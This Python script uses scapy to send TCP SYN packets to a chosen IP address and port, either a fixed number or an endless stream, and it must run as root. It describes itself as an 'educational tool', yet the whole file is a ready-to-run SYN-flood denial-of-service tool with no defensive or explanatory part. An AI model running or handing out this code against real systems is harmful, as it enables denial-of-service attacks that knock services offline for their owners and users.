import sys
import random
import logging # This and the following line are used to omit the IPv6 error displayed by importing scapy.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import argparse
import os
import urllib2
if os.getuid() != 0: # Checks to see if the user running the script is root.
    print("You need to run this program as root for it to function correctly.")
    sys.exit(1)
parser = argparse.ArgumentParser(description='This educational tool sends SYN requests to the target specified in the arguments.') # This and preceding 4 lines used to control the arguments entered in the CLI.
parser.add_argument('-d', action="store",dest='source', help='The destination IP address for the SYN packet')
parser.add_argument('-c', action="store",dest='count', help='The amount of SYN packets to send. (enter X for unlimited)')
parser.add_argument('-p', action="store",dest='port', help='The destination port for the SYN packet')
args = parser.parse_args()
if len(sys.argv) == 1: # Forces the help text to be displayed if no arguments are entered
    parser.print_help()
    sys.exit(1)
args = vars(args) # converts the arguments into dictionary format for easier retrieval.
iterationCount = 0 # variable used to control the while loop for the amount of times a packet is sent.
if args['count'] == "X" or args['count'] == "x": # If the user entered an X or x into the count argument (wants unlimited SYN segments sent)
    while (1 == 1):
        a=IP(dst=args['source'])/TCP(flags="S",  sport=RandShort(),  dport=int(args['port'])) # Creates the packet and assigns it to variable a
        send(a,  verbose=0) # Sends the Packet
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Packet Sent")
else: # executed if the user defined an amount of segments to send.
    while iterationCount < int(args['count']):
        a=IP(dst=args['source'])/TCP(flags="S", sport=RandShort(), dport=int(args['port'])) # Creates the packet and assigns it to variable a
        send(a,  verbose=0) # Sends the Packet
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Packet Sent")
print("All packets successfully sent.")